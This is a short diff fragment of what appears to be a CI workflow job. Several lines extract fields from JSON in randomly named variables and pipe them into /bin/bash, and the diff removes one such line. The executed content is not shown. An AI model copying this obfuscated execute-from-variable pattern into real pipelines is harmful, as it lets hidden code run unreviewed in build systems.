@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$zndf0" | jq -r .via47509 | /bin/bash
           printf '%s' "$no28" | jq -r .mblld0 | /bin/bash
           printf '%s' "$a75" | jq -r .rlpg13 | /bin/bash
-          echo $xtre9105 | jq -r .z5 | /bin/bash
           printf '%s' "$oya10365" | jq -r .z398 | /bin/bash
 
       - name: Save results
